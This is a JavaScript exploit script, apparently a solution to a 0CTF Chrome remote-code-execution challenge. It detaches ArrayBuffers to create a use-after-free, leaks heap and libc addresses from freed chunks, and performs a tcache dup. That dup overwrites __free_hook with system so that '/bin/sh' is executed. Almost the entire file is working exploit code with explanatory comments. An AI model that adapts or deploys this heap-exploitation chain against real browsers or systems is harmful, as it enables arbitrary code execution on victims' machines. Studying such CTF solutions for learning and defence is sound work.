// 0CTF Chrome RCE
// libc.so.6: a1ca4cd2d1df2fcd2c0f582665051c261d84c1d6

var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function btoi(a) {
	var b = new BigUint64Array(a.buffer);
	return b[0];
}

function itob(a) {
	var b = new Uint8Array(BigUint64Array.from([a]).buffer);
	return b;
}

// Unsorted chunks
let c = new Uint8Array(0x500);
let a = new Uint8Array(0x500);

// Freed and placed in unsorted bin
%ArrayBufferDetach(a.buffer);

c.set(a);

// When unsorted chunk is free:
// chunk->fd will be an another chunk in unsorted bins
// chunk->bk will be main_arena pointer in libc

let heap_leak = btoi(c.slice(0, 8));  // chunk->fd
let libc_leak = btoi(c.slice(8, 16)); // chunk->bk
let libc_base = libc_leak-0x1ebbe0n;

console.log("[+] Heap leak: 0x" + heap_leak.toString(16));	
console.log("[+] Libc leak: 0x" + libc_leak.toString(16));	
console.log("[+] Libc base: 0x" + libc_base.toString(16));	

let system = libc_base+0x55410n;
let __free_hook = libc_base+0x1eeb28n;

// fastchunks that will be tcached when freed
let e = new Uint8Array(0x50);
let f = new Uint8Array(0x50);

// Freeing chunks
%ArrayBufferDetach(e.buffer);
%ArrayBufferDetach(f.buffer);

// Tcache dup
// Overwritting chunk->fd to have chunk->fd = __free_hook
f.set(itob(__free_hook));

console.log("[+] System leak: 0x" + system.toString(16));	
console.log("[+] __free_hook leak: 0x" + __free_hook.toString(16));	

// forcing length constraints on allocation
// to force v8 to retrieve chunks from the appropiate tcache bin
var x = {};
x.length = 0x50;

// g = chunk; tcache bin 0x60 bin = __free_hook
let g = new Uint8Array(x);

// h = __free_hook
let h = new Uint8Array(x);

// Overwritting __free_hook with system
h.set(itob(system));

// calling __free_hook("/bin/sh")
console.log("/bin/sh");
